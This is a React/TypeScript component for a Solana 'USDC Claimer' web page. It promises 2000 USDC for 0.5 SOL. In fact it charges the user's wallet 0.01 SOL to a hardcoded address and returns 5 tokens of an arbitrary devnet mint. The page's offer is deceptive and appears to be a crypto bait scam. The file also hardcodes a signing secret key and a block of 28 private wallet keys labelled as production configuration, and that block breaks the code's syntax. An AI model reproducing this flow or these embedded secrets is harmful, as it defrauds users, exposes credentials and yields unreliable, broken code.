/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "GDdQ4Fjx1uASGhsK1VRjkGEB7bcmy4U9sMF8rKLnRuzgN9aZk9XiB9NPqWUqk55p5dzGPq8Pn4KG8f9vNS9yJnF"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4PSTwh9H8yyJhjpiunEcbwshyFkLN7KVf1ywDzdGErxP5jTqRLa9FoURxGntNQFJuPTjsjYQq63gamiCq3eJEt5L",
  "key1": "61h6yxZxPHVLLeBkpcri6wLdg7AZnu3a1gcMTETY2gfGrZCD83hFazCdisyGzeGGrNTDnkhBzTVfygPp1SYqxVtN",
  "key2": "5kHR5Y4tSGA1BP1MptVensfHRUUqLjdzuqGyxodjVRfYwuQy1QHRYuKYndhMR1krPxRfTwapo4XNLmdstMcsBGYi",
  "key3": "4JSwkZdiZWWHSFrKRBoxSqkrR51U238LRfjSyTBPowh5WpmMXyViEdv1jFEwmBHFw7cKcYJPxbbgaBRL3pQSnVmU",
  "key4": "5Eiay8nrYGBHxtYqxQsuA7g4FZydkJvvd1196WD2WtN1CZKbbTL9UhmLn4PR3BxNvcy8wC6B9C8pDfPU9xxjZg3L",
  "key5": "2qGjwfAoPc5MGsjJYAYj9hTpXQPmsq6ThJv6QmRkDPPvQTDWKVGJvdx6FB3ujzacjRSm2rmxTNz4qaxzb4HeQBmx",
  "key6": "2YC8B6TtynjKMz6oosuKfCK7rbfYiwRhj1ap5ka5XvA5Sawtqwf7GnNJaZjQpnJDs6h1urva6j5bHjnrHxghL91X",
  "key7": "3AtTPpnZaqBana11bcotobtDhE3TDLknfi55mrFqKWA9kZ124s84vQx6zjadZQuyfCSy67Nu7AEqdKqUCKJrqhMD",
  "key8": "3XFCeGbVH7fxT5V9chma2PJwsGhXN3MvhaZ85P4sfpnNrZvNwUHyUZwaHvxs924sPgDxr2n636va7JeJxWcZspxq",
  "key9": "2qtKgrep53Fd4uW1qr17fQ8nPPnQNAe9yNuh2h16daJrdFBkaKoMsmHW8coJrYptHLadL7KVTGCmdrCVNFFJTGUQ",
  "key10": "kxpsEjEfNYb6HKmhEWwxBTNMXRR1UVsjroVvZE1bb4G1eEAYghSyozbhMsmwjR8DaHBuh5DN1K9Ff2FbVEcBg1x",
  "key11": "5TMXqomWt2dWzm73fW6p6kj2c7XieWX5VpehYezq8bSgGAfzkEARucFBDHoEf6QLNAViZyCyM8dWtkP92EzhEVh1",
  "key12": "gxL1LoEjVMCE7u6v8ikpp4ty93d6aoV5kPSqqH8eEcy4qJQWaK8jVCXa1Jw9X5mz1BQ7q1TssaYZjH679YCSAxm",
  "key13": "3cwSCheuSSjbFZA55VFSyDJxhieNHT8ZdwoCMkfub9ZshGVSy2Lh4nDKPbS1BYSdWpa8rYYJqM88sgnM2CAA5nWK",
  "key14": "64grAgxHbpv7UsrgEBF9ucGEQThHDhYEKTGmhuvhBypwxzHcgMpJSebwgmsgUBR8GUKnN1xv8caMfcU7oVAybdvY",
  "key15": "3vUpddT5kDtPR1eo97XYdofuEbVseaHjTfjgctrC1dkNRVpHKwdy3VKxfmMdYUvjcXoxTe5EzW4pvvPJU13xXAur",
  "key16": "3PhWdyUEdFGkAemBweMd42Ph7kzbeGg7V3wnvJAqwHXhwWpgSMsQXGJoGvwrurzNE9mbDztBRtvJ4w88spN9cq3B",
  "key17": "5U89TWmSjqNWVV9eRZAiM2ceVgWvB7oB1fAnJNTqZY2WLUS6ZB2Pmfb8bJ1XSzzaP5PeESw1M7HAZFJjMJDPGoNK",
  "key18": "LYKkCC6XGERXFU1PYFSS3CJsj5GmZZ6HX8sh61M2EY33ahJ9vUe8y6RuCofpzy3uVhMYibSjVhF1cfghK1Bbhr5",
  "key19": "2JjAvFdSw5XE37pastPgjHXCtVqkgedgTn5ieBwi7kMNR5xXc4M19hnMxeZA6zRFtEU2shrE8xJQwonehwDqxU9D",
  "key20": "AdZXmkMMQuqLfzXhS54ULCatmjEuMZqXNhyK7tGrmXHUBiz6QVLRd7QpkrMoCfDUy9rQMV2du3APvzpAifirFt8",
  "key21": "49QftRhu26BGrbNDh9B2Yp4o3PNXhoipFr6Vwg22VE7hpxDCexhX18C8Y1DSAHyVSKMhxUtDxyAKmoHKhigmNVLM",
  "key22": "CgTFiphxn4rtnc5gW6jFiuLNEtKXt4vRTqSAxa3y9Xxa7jM6m7xjFUzS6qFC2V96mNxqtpbZ16zjgDY5DPoJNyD",
  "key23": "56zwtY825YgnRyddobjqeFbH4q2VcCbWPY6jPe3JhNk1PghhZN6wa3HebZs5WjV5HVLv5N9d2XwZppiJuf45S7WH",
  "key24": "3zWQ8FdViJNvuUTzL4eawwpViv9hY7uoEUKk2oCmbeFvV3qykA8E1DeYLknk8RMt6b2X3MbaSEsPADuT47qhm1Q7",
  "key25": "QTBhdasngjFUXLa7sCRPkSUX4CVHF5mUdsaYDfzHTwhvbyNpPGsDQ4H7gduqRUHRDEVE6quiFK21XkJL3ucqska",
  "key26": "4LESg3kSw97WFPGxbpbbPZmxn66ENUb86Ty4WiV7rmVpaaTq9Q5sLeVrZp36xbi4bixr5Fc5GvwELDhe5YGxEusF",
  "key27": "4yuk1suePPgv3uUvi4sefwYjHbWCMKMXN2p1zM3nUvpz4VGkCKPV896jw8y937v9eUmr43Uik7pzVfKLunD72X3L"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
